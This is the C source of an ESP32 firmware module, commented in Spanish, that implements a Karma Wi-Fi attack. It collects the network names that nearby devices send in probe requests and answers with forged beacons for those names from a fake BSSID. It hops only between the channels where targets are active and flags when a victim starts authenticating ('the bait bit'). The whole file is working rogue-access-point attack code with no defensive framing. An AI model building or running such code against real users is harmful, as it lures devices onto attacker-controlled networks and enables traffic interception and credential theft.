/*
 * karma.c — Karma sobre rf_core
 *
 * El hopper se detiene y esta tarea salta SOLO entre los canales donde
 * hay objetivos activos: asi cubres varios SSID a la vez sin gastar
 * tiempo en canales vacios.
 */
#include <string.h>

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_log.h"
#include "esp_timer.h"

#include "rf_core.h"
#include "karma.h"

static const char *TAG = "karma";

static karma_target_t  s_t[KARMA_MAX_TARGETS];
static volatile int    s_run;
static TaskHandle_t    s_task;
static karma_auth_cb_t s_auth_cb;

#define KARMA_TTL_US     (15000000LL)   /* 15 s sin probes -> fuera  */
#define KARMA_BEACON_US  (102400LL)     /* 100 TU = 102.4 ms        */
#define KARMA_BURST      3

static void karma_task(void *arg);

static int64_t now_us(void) { return esp_timer_get_time(); }

/* BSSID localmente administrada y reconocible: 02:4B:41:52:4D:41 */
static void gen_bssid(uint8_t *out)
{
    static const uint8_t base[6] = {0x02, 0x4B, 0x41, 0x52, 0x4D, 0x41};
    memcpy(out, base, 6);
}

/* Siguiente canal con objetivos activos. 0 = no hay ninguno. */
static uint8_t next_target_channel(void)
{
    static uint8_t idx = 0;
    uint8_t chans[KARMA_MAX_TARGETS];
    int n = 0;

    for (int i = 0; i < KARMA_MAX_TARGETS; i++) {
        if (s_t[i].active) chans[n++] = s_t[i].chan;
    }
    if (n == 0) return 0;

    idx = (uint8_t)((idx + 1u) % (uint8_t)n);
    return chans[idx];
}

/* ------------------------------------------------------------------ */
esp_err_t karma_init(void)
{
    memset(s_t, 0, sizeof(s_t));
    s_run = 0;

    /* Core 0: esp_wifi_set_channel() toca estructuras del driver, y
     * queremos localidad de cache con el stack Wi-Fi. */
    if (xTaskCreatePinnedToCore(karma_task, "karma", 4096, NULL, 8,
                                &s_task, 0) != pdPASS) {
        return ESP_ERR_NO_MEM;
    }
    ESP_LOGI(TAG, "karma listo");
    return ESP_OK;
}

void karma_start(void)
{
    /* El hopper y Karma se pelean por el canal: Karma manda. */
    rf_hop_stop();
    s_run = 1;
    ESP_LOGW(TAG, "karma ACTIVO — hopper detenido");
}

void karma_stop(void)
{
    s_run = 0;
}

void karma_set_auth_cb(karma_auth_cb_t cb)
{
    s_auth_cb = cb;
}

uint32_t karma_target_count(void)
{
    uint32_t n = 0;
    for (int i = 0; i < KARMA_MAX_TARGETS; i++) {
        if (s_t[i].active) n++;
    }
    return n;
}

karma_target_t *karma_targets(void)
{
    return s_t;
}

/* ------------------------------------------------------------------ */
void karma_feed(const rf_mgmt_info_t *m)
{
    if (m == NULL || s_run == 0) return;

    if (m->subtype == RF_SUB_PROBE_REQ && m->ssid_len > 0) {
        karma_target_t *hit = NULL;
        karma_target_t *free_slot = NULL;

        for (int i = 0; i < KARMA_MAX_TARGETS; i++) {
            if (!s_t[i].active) {
                if (free_slot == NULL) free_slot = &s_t[i];
                continue;
            }
            if (s_t[i].ssid_len == m->ssid_len &&
                memcmp(s_t[i].ssid, m->ssid, m->ssid_len) == 0) {
                hit = &s_t[i];
                break;
            }
        }

        karma_target_t *t = hit ? hit : free_slot;
        if (t == NULL) return;                       /* lleno */

        if (hit == NULL) {
            memset(t, 0, sizeof(*t));
            t->active    = true;
            t->ssid_len  = m->ssid_len;
            memcpy(t->ssid, m->ssid, m->ssid_len);
            t->ssid[m->ssid_len] = '\0';
            gen_bssid(t->bssid);
            t->first_us = now_us();
            ESP_LOGW(TAG, "CEBO NUEVO -> '%s' (ch%d)", t->ssid, m->chan);
        }

        t->chan          = m->chan;
        t->probes++;
        t->last_probe_us = now_us();
    }
    else if (m->subtype == RF_SUB_AUTH) {
        for (int i = 0; i < KARMA_MAX_TARGETS; i++) {
            if (s_t[i].active && memcmp(s_t[i].bssid, m->bssid, 6) == 0) {
                ESP_LOGW(TAG, "AUTH para '%s': el cebo mordio", s_t[i].ssid);
                if (s_auth_cb != NULL) s_auth_cb(s_t[i].ssid, s_t[i].chan);
                break;
            }
        }
    }
}

/* ------------------------------------------------------------------ */
static void karma_task(void *arg)
{
    (void)arg;

    for (;;) {
        if (s_run == 0) {
            vTaskDelay(pdMS_TO_TICKS(100));
            continue;
        }

        int64_t t = now_us();

        /* caducidad */
        for (int i = 0; i < KARMA_MAX_TARGETS; i++) {
            karma_target_t *e = &s_t[i];
            if (!e->active) continue;
            if (t - e->last_probe_us > KARMA_TTL_US) {
                ESP_LOGI(TAG, "objetivo expirado: '%s'", e->ssid);
                e->active = false;
            }
        }

        if (karma_target_count() == 0) {
            vTaskDelay(pdMS_TO_TICKS(20));
            continue;
        }

        /* salta solo entre canales con objetivos activos */
        uint8_t ch = next_target_channel();
        if (ch != 0) {
            rf_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        }

        for (int i = 0; i < KARMA_MAX_TARGETS; i++) {
            karma_target_t *e = &s_t[i];
            if (!e->active || e->chan != ch) continue;
            if (t - e->last_beacon_us < KARMA_BEACON_US) continue;

            for (int b = 0; b < KARMA_BURST; b++) {
                rf_beacon_tx(e->ssid, e->bssid, e->chan, e->wpa2);
            }
            e->last_beacon_us = now_us();
        }

        vTaskDelay(pdMS_TO_TICKS(2));
    }
}
